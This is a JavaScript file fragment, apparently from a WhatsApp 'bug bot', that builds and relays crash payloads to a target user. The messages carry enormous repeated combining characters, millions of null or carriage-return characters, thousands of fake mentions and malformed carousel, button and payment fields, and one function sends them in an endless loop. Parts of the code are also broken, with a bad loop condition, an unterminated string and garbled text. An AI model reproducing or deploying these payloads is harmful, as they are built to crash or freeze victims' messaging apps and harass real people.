                newsletterName: "Minato is here😹︎" + "b҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(12000)
              },
              quotedmessage: {
                paymentInviteMessage: {
                  expiryTimestamp: Date.now() + 1814400000,
                  serviceType: 3,
                }
              }
            }
          }
        }
      }
    }, { userJid: target })

    await minato.relayMessage(target, PouMsg1.message, { 
    messageId: PouMsg1.key.id 
    })
    console.log("DONE BY Minato")

  } catch (error) {
    console.error("EROR COK:", error)
  }
}

async function boundssex(target) {
    await minato.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: ".",
                        locationMessage: {},
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "null message by minato" + "\0".repeat(900000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\0"
                    },
                    carouselMessage: {}
                }
            }
        }
    }, { participant: { jid: target } });
}

async function CrashVideo(target) { const BokepPou = await prepareWAMessageMedia( { video: { url: "https://mmg.whatsapp.net/v/t62.7161-24/543874146_701733799656425_1962288507009302343_n.enc?ccb=11-4&oh=01_Q5Aa3AFiej4nbt_M9XxYBDpplVdFUucRd510mCaU-IGU5nR_-Q&oe=6947C949&_nc_sid=5e03e0", }, mimetype: "video/mp4", fileSha256: "sI35p92ZSwo+OMIPRJt2UlKUFmwgwizYOheNU7LtO5k=", fileEncSha256: "/6FWCFe34cg/QH4RpN3AOLTOS8wLJ9JI6zQoyJZgg5Y=", fileLength: 3133846, seconds: 26, }, { upload: minato.waUploadToServer, } );

const PouButton = { buttons: [ { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), id: null, }), }, { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), id: null, }), }, { name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), url: "https://" + "𑜦𑜠".repeat(10000) + ".com", }), }, { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "𑜦𑜠".repeat(10000), copy_code: "𑜦𑜠".repeat(10000), }), }, { name: "galaxy_message", buttonParamsJson: JSON.stringify({ icon: "PROMOTION", flow_cta: "𖣇 𖣇", flow_message_version: "3", }), }, { name: "galaxy_message", buttonParamsJson: JSON.stringify({ flow_cta: "\u0000".repeat(200000), }), version: 3, }, ], };

const PouCarousel = () => ({ header: { ...BokepPou, hasMediaAttachment: true, }, nativeFlowMessage: PouButton, });

const PouNode = [{ tag: "bot", attrs: { biz_bot: "1" } }];
while (true) { const PouMsg = await generateWAMessageFromContent(target, { ephemeralMessage: { message: { viewOnceMessage: { message: { ephemeralSettingRequestMessage: { ephemeralDuration: 0, }, messageContextInfo: { messageSecret: crypto.randomBytes(32), supportPayload: JSON.stringify({ version: 2, is_ai_message: true, should_show_system_message: true, ticket_id: crypto.randomBytes(16), }), PouNode, }, interactiveMessage: { body: { text: "𖣇 𝐏𝐎𝐔 𝐀𝐍𝐉𝐀𝐘 𝐌𝐀𝐁𝐀𝐑 𖣇", }, messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 3, isStatusBroadcast: true, statusBroadcastJid: "status@broadcast", badgeChat: { unreadCount: 0 }, }, forwardedNewsletterMessageInfo: { newsletterJid: "proto@newsletter", serverMessageId: 1, newsletterName: "𖣇 𖣇", contentType: 3, accessibilityText: "", }, carouselMessage: { cards: [ PouCarousel(), PouCarousel(), PouCarousel(), PouCarousel(), PouCarousel(), ], }, contextInfo: { participant: target, remoteJid: "status@broadcast", expiration: 250208, ephemeralSettingTimestamp: 250208, entryPointConversionSource: "WhatsApp.com", entryPointConversionApp: "WhatsApp", entryPointConversionDelaySeconds: 9742, disappearingMode: { initiator: "INITIATED_BY_OTHER", trigger: "ACCOUNT_SETTING", }, quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000, }, }, }, }, }, }, }, }, });

await minato.relayMessage(target, PouMsg.message, {
  messageId: PouMsg.key.id,
});
await minato.sendMessage(target, { delete: PouMsg.key });
await new Promise((r) => setTimeout(r, 300));
await minato.sendNode(target, [
  {
    tag: "message",
    attrs: {
      id: minato.generateMessageTag(),
      to: target,
    },
    content: [PouMsg],
  },
]);
} }

async function CardVisible(target) {
  const cards = [];
  for (let z = 0; z = 1000; z++) {
    const header = {
      title: 'Evolution.gntg,
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/12149372_10035125079888877_2626754303498270911_n.enc?ccb=11-4&oh=01_Q5Aa1wFIr19qtg1EEatsDh09AHko83pYR8bYGzU7Wc9zCWh48Q&oe=68726852&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "d0JIqFXbkYr7Q0BsVZB8ofnTO0JZYauyDGLNopgLfNo=",
        fileLength: 2502200825022008,
        seconds: 77777777,
        mediaKey: "wuED6VegoqlOHx9IZYQjMj3ySrhgtpJs/NlzrlXgCck=",
        height: 1088,
        width: 736,
        fileEncSha256: "KGszaobqQ8QKFOp1UrgqvRp54SEhCNfyp8/dfLqbFVs=",
        directPath: "/v/t62.7161-24/12149372_10035125079888877_2626754303498270911_n.enc?ccb=11-4&oh=01_Q5Aa1wFIr19qtg1EEatsDh09AHko83pYR8bYGzU7Wc9zCWh48Q&oe=68726852&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1749737059",
        contextInfo: {},
        streamingSidecar: "xey0UW72AH+ShCjYXVzOom/k+kt7VJryEZ+yNyAarqVJHx8L4j6sB4Da5ZGHXTfzX9g=",
        thumbnailDirectPath: "/v/t62.36147-24/19977827_1442378506945978_3754389976888828856_n.enc?ccb=11-4&oh=01_Q5Aa1wGz9o9ukGbtWxoetr_ygoJDy0SN80KaAwJ1vywXvbTH8A&oe=687247F9&_nc_sid=5e03e0",
        thumbnailSha256: "hxKrzb6DDC8qTu2xOdeZN4FBgHu8cmNekZ+pPye6dO0=",
        thumbnailEncSha256: "Es1ZWpjDKRZ82XpiLARj3FZWh9DeFCEUG2wU8WHWrRs=",
        annotations: [
          {
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "1942620729844671",
                songId: "432395962368430",
                author: "饾悅酶饾惈饾悶饾悧 獾� 饾悇饾惎饾惃饾惀饾惍饾惌饾悽饾惃饾惂",
                title: "袛褩褕邪褍懈 袞褨褜锌邪褉褉褨锌",
                artworkDirectPath: "/v/t62.76458-24/11810390_1884385592310849_8570381233425191298_n.enc?ccb=11-4&oh=01_Q5Aa1wFo3eosJQYj_I0wJby373H-MKodRwdx1sCOEt426yyLCg&oe=687233BB&_nc_sid=5e03e0",
                artworkSha256: "8x8ENCxJyIrSFnF9ZHtiim423uGgPleSm8zPEbQZByE=",
                artworkEncSha256: "HlsJKALVejvghjYZIrY46zosCX568b1cG9SzzZfCPNA=",
                artistAttribution: "",
                countryBlocklist: "",
                isExplicit: false,
                artworkMediaKey: "0DsOnYZAyNwPJgs5PZwL/EtFxBXO2cW9zwLYZGcAkvU="
              }
            },
            embeddedAction: true
          }
        ]
      }, 
      hasMediaAttachment: true, 
    };
    cards.push({
      header, 
      nativeFlowMessage: {
        buttons: [{
          name: ""
        }], 
        messageVersion: 3
      }
    })
  }
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: "Evolution.gntg"
          },
          carouselMessage: {
            cards
          },
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z+1}@s.whatsapp.net`),
            participant: "0@s.whatsapp.net",
            isGroupMention: true,            
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(1000000)}\"}`, 
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "status@broadcast"
          }
        }
      }
    }
  }, {});

  await minato.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function Flowaderbug2(minato, target) {
let payload = "";
for (let i = 0; i < 900; i++) {
   payload = "\r".repeat(2097152);
}
const mentionedJid = [
    "0@s.whatsapp.net",
    ...Array.from({ length: 1901 }, () => "1" + Math.floor(Math.random() * 90000000000) + "@s.whatsapp.net")
];
  try {
    const PImageUndefined = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                   url: "https://mmg.whatsapp.net/v/t62.7118-24/560975145_1175458848077626_3845279104413413463_n.enc?ccb=11-4&oh=01_Q5Aa3QHQ433x53I_c-LSzt-a-f2enAXFukLnWztzFr1EI5_qxg&oe=697B1B38&_nc_sid=5e03e0&mms3=true",
                   mimetype: "image/jpeg",
                   fileSha256: "Bbaa1hJXk0kv9UWj7Eb+Sx69DprTyVX0ulY7D5D67ik=",
                   fileLength: "225570",
                   height: 1600,
                   width: 10,
                   mediaKey: "/C/bZZFM+Ws9fa6Pkd3rCf3fecBvGXgR7gTm4rCnPh8=",
                   fileEncSha256: "K6nLf4rE75pOYhyBvijsEqqk7SkXE7uD14FjzLE/rrw=",
                   directPath: "/v/t62.7118-24/560975145_1175458848077626_3845279104413413463_n.enc?ccb=11-4&oh=01_Q5Aa3QHQ433x53I_c-LSzt-a-f2enAXFukLnWztzFr1EI5_qxg&oe=697B1B38&_nc_sid=5e03e0",
                   mediaKeyTimestamp: "1767087881",
                   jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAvAAADAQEBAAAAAAAAAAAAAAADBAUCAQABAQEBAQEAAAAAAAAAAAAAAAEDAgAE/9oADAMBAAIQAxAAAAC7KTT3YXsuHpBwnmGaOldzKgQA8fUacjUrKncUuRVbcnV+02gYiBVYDirssyKabQFm1KlLqPj6puV1DI431f/EACQQAAICAQQCAgMBAAAAAAAAAAECAAMRBBIhMQUTQUIQIjJR/9oACAEBAAE/AB47RAIcdTzRUsgX6wzBiWMlm8dxgB9smVhxYu3vPEs8jqK2AzkiDW21MtRbcqGaiz22FsmZmno92STgTUVLW2FMwqDBHa9